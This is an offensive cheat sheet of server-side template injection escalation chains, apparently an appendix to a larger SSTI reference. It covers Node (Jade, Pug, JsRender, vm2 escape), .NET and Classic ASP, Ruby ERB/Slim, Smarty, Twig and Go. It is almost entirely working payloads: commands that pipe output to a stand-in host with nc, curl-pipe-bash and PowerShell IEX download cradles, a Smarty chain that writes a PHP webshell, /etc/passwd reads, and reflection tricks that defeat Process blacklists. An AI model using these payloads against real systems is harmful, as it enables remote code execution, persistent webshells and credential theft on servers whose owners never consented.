# Node / .NET / Ruby / Smarty / Twig SSTI escalation chains — Open WHEN: you have fingerprinted a Node (Pug/Jade/JsRender/Handlebars, vm2/isolated-vm), .NET (Razor/ASP), Ruby (ERB/Slim), Smarty or Twig sink and the body's one-liner is filtered or sandboxed

The body already has the basic EJS/Pug/Nunjucks/Handlebars one-liners, the
`constructor.constructor` traversal, Razor `Process.Start`, and the Twig
`filter('system')` / `_self` lines. Use this for the chains it omits.

## Node — Jade/Jade-step-form, JsRender, vm2/isolated-vm escape
Jade as ordered code lines (works where inline `#{...}` is stripped):
```
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc OOB.example.net 80')
```
Jade direct read:
```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
JsRender server-side (`{{:...}}` evaluate tag):
```
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
vm2 / isolated-vm escape — the expression context still leaks `this.process.mainModule.require`, so OS commands run even when "Execute Command" nodes are disabled (n8n-class CVE-2026-21858):
```
={{ (function() {
  const require = this.process.mainModule.require;
  return require("child_process").execSync("id").toString();
})() }}
```
PugJs IIFE form (when the body's plain `#{...}` is filtered):
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl OOB.example.net/s.sh | bash')}()}
```
Handlebars path-traversal → require arbitrary JS (alternative to the body's gadget): POST `{"profile":{"layout":"./../routes/index.js"}}`.

## .NET — reflection bypass (classes blacklisted / not in assembly)
Load a DLL at runtime, then invoke `Process` — defeats `Process` blacklists:
```
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null, "/bin/bash,-c ""whoami""".Split(","))}
```
Load DLL straight from the request (no filesystem write): `GetMethod("Load",[typeof(byte[])]).Invoke(null,[Convert.FromBase64String("...")])`.
Classic ASP (`<%= ... %>`) command exec:
```
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://OOB/shell.ps1')").StdOut.ReadAll() %>
```

## Ruby — ERB full set & Slim
ERB beyond the body's `system('id')`:
```
<%= Dir.entries('/') %>
<%= IO.popen('ls /').readlines() %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
```
Slim (`{ ... }` delimiter, `%x|...|` runs a shell):
```
{ %x|env| }
```
Mojolicious (Perl, ERB-style tags): `<%= 7*7 %>` → 49, then `<% perl code %>`.

## Smarty (PHP) — version + write-file webshell
```
{$smarty.version}                                                              # fingerprint
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}   # drop webshell
{system('cat index.php')}                                                      # compatible v3
```

## Twig (PHP) — undefined-filter-callback RCE & filter chains
Beyond the body's `filter('system')`, register an arbitrary PHP callback:
```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
Whitespace-free command (no literal spaces survive): `{{['cat$IFS/etc/passwd']|filter('system')}}` or `{{['cat\x20/etc/passwd']|filter('system')}}`.
Silence PHP warnings so automated chains don't break: `{{["error_reporting","0"]|sort("ini_set")}}`.
Load a remote template over a controlled FTP channel: `{{_self.env.setCache("ftp://OOB.example.net:2121")}}{{_self.env.loadTemplate("poc")}}`.

## Go `text/template` — define/invoke bypasses html-escaping
`text/template` allows calling any exported method via `call`; `html/template` does not but you can still define+invoke to dodge encoding:
```
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
{{ .System "ls" }}      # only if the context object exposes a command-running method
```
